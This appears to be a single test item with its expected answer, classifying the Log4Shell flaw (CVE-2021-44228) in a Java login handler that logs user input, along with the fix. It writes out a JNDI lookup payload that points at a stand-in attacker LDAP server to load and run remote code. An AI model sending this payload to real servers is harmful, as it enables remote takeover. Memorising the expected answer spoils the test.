# Example 1: Log4Shell, CVE-2021-44228, Log4j JNDI RCE

Expected verdict: real

Expected: REAL - critical. CVE-2021-44228, Log4j 2.0-beta9 to 2.14.1, CVSS 10.0, disclosed 10 Dec 2021. Fix: upgrade to Log4j 2.17.1 or later.

Check: none, no clean mapping onto the 7 known checks

```
CVE-2021-44228 (Log4Shell), CVSS 10.0, Apache Log4j 2, versions 2.0-beta9 to 2.14.1, disclosed 10 Dec 2021.
Code in a Java login handler, Log4j 2.14.1:

String username = request.getParameter("username");
logger.info(username);

username comes straight from the login form, no validation. Log4j expands ${...} lookups inside the logged message, including a JNDI lookup. An attacker sends username ${jndi:ldap://attacker-controlled-ldap-server/a} and the server performs the lookup, loads a remote Java class and runs it. Fix: upgrade Log4j to 2.17.1 or later, or set log4j2.formatMsgNoLookups=true.
```
